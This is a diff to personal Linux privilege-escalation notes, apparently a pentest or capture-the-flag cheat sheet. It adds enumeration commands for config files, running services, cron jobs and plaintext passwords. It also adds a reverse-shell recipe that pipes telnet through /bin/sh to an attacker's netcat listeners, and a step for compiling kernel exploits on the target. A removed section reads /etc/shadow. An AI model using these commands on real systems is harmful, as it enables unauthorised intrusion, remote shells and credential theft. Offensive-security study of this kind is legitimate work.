@@ -1,16 +1,118 @@
 arrange by 
+
 manual
+
 kernel vuln
+
 sudo
+
 services as root
+
 editors
-other 
+
+other methods
+
+# Some manual enumeration within files.
+~~~
+what's the distribution type? What version?
+cat /etc/issue
+cat /etc/*-release
+cat /etc/lsb-release      # Debian based
+cat /etc/redhat-release   # Redhat based
+~~~
+~~~
+What can be learnt from the environmental variables?
+cat /etc/profile
+cat /etc/bashrc
+cat ~/.bash_profile
+cat ~/.bashrc
+cat ~/.bash_logout
+env
+set
+~~~
+~
+# Aplication & Services
+~~
+What services are running? Which service has which user privilege?
+ps aux
+ps -ef
+top
+cat /etc/services
+~~~
+~~~
+Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!
+ps aux | grep root
+ps -ef | grep root
+~~~
+~~~
+What applications are installed? What version are they? Are they currently running?
+ls -alh /usr/bin/
+ls -alh /sbin/
+dpkg -l
+rpm -qa
+ls -alh /var/cache/apt/archivesO
+ls -alh /var/cache/yum/
+~~~
+~~~
+Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?
+cat /etc/syslog.conf
+cat /etc/chttp.conf
+cat /etc/lighttpd.conf
+cat /etc/cups/cupsd.conf
+cat /etc/inetd.conf
+cat /etc/apache2/apache2.conf
+cat /etc/my.conf
+cat /etc/httpd/conf/httpd.conf
+cat /opt/lampp/etc/httpd.conf
+ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
+~~~
+~~~
+What jobs are scheduled?
+crontab -l
+ls -alh /var/spool/cron
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny
+cat /etc/crontab
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root
+~~~
+~~~
+Any plain text usernames and/or passwords?
+grep -i user [filename]
+grep -i pass [filename]
+grep -C 5 "password" [filename]
+find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
+~~~
+~~~
+What other users & hosts are communicating with the system?
+lsof -i
+lsof -i :80
+grep 80 /etc/services
+netstat -antup
+netstat -antpx
+netstat -tulpn
+chkconfig --list
+chkconfig --list | grep 3:on
+last
+~~~
+~~~
+Have you got a shell? Can you interact with the system?
+nc -lvp 4444    # Attacker. Input (Commands)
+nc -lvp 4445    # Attacker. Ouput (Results)
+telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
+~~~
+
 
 # Kernel vulnerability. (exploit suggester or manual based on version)
 ~~~
 1. Uname -a
 2. linux-exploit-suggester-2.pl -k <KERNEL_VERSION>
-gcc <spoilers> -o exploit -Wl,--hash-style=both
+(on target) gcc <spoilers> -o exploit -Wl,--hash-style=both
 gcc -m32 -Wl,--hash-style=both
 ~~~
 # Suid misconfiguration. Example programs: nmap vim nano 
@@ -125,19 +227,6 @@ Is exim compiled with perl support?
 exim -bV -v | grep -i perl  
 Does exim.conf contain “perl sartup” option? 
 Use cve-2016-1531.sh 
-~~~
-# Some manual enumeration within files.
-~~~
-uname -a 
-env 
-id 
-cat /proc/version 
-cat /etc/issue 
-cat /etc/passwd 
-cat /etc/group 
-cat /etc/shadow 
-cat /etc/hosts 
-grep -vE "nologin" /etc/passwd
 ~~~
 # Check vulnerable software.
 ~~~
